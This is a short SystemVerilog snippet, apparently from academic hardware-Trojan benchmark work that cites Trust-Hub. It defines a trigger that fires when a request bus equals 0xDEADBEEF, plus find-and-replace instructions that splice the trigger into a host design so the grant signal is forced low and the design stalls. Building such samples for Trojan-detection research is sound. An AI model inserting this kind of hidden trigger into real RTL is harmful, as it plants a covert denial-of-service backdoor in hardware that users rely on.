/**
 * Combinational Availability Trojan - Code Snippet
 * 
 * Trust-Hub Category: Performance Degradation ✓ (category exists, gate-level only)
 * Literature Sources: Boraten & Kodi 2016, Jin & Makris 2008, Hoque et al. 2020
 * 
 * Description:
 *   Degrades performance by disabling ready signals
 *   
 * Trigger: Pattern match on req
 * Payload: Disable grant
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Trigger pattern
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (req == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Performance Degradation: Disable grant when triggered
//
// Integration Script Must Modify:
//
// IF grant is ready/valid signal:
//   Find: assign grant = ready_condition;
//   Replace: assign grant = trojan_active ? 1'b0 : ready_condition;
//
// This creates artificial wait states, degrading performance
// Note: For combinational logic, this is similar to DoS but with
//       different trigger conditions and lower severity